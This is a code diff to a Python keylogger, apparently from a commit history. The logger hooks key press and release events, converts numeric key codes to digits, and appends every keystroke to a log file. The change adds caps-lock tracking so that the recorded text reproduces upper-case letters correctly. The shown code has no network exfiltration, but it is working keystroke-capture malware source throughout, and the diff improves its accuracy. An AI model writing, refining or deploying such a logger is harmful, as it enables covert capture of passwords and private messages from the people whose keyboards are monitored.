@@ -5,18 +5,22 @@ from time import time
 
 show_detail = False
 log_file = None
+caps_lock = False
 numbers = {
     '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7',
     '<104>': '8', '<105>': '9'
 }
 
 
-
 def on_press(key):
     global show_detail
-
+    global caps_lock
     key = str(key).replace("'", "")
 
+    if key == "Key.caps_lock":
+        caps_lock = True if caps_lock == False else False
+
+    # convert number into a digital format. p.e: <97> into 1
     try:
         if key.find('>') > 0:
             key = numbers[key]
@@ -24,6 +28,7 @@ def on_press(key):
         key = "[Error]"
 
     save(key)
+
     if show_detail == True:
         print(f"'{key}' pressed")
 
@@ -36,13 +41,15 @@ def on_release(key):
 # save every pressed key in a log file
 def save(key):
     global log_file
+    global caps_lock
+
     with open(log_file, "a") as log:
         if key.find("space") > 0:
             log.write(' ')
         elif key.find("enter") > 0:
             log.write('\n')
         elif key.find("Key") == -1:
-            log.write(key)
+            log.write(key) if caps_lock == False else log.write(key.upper())
 
 
 args_parser = ArgumentParser()
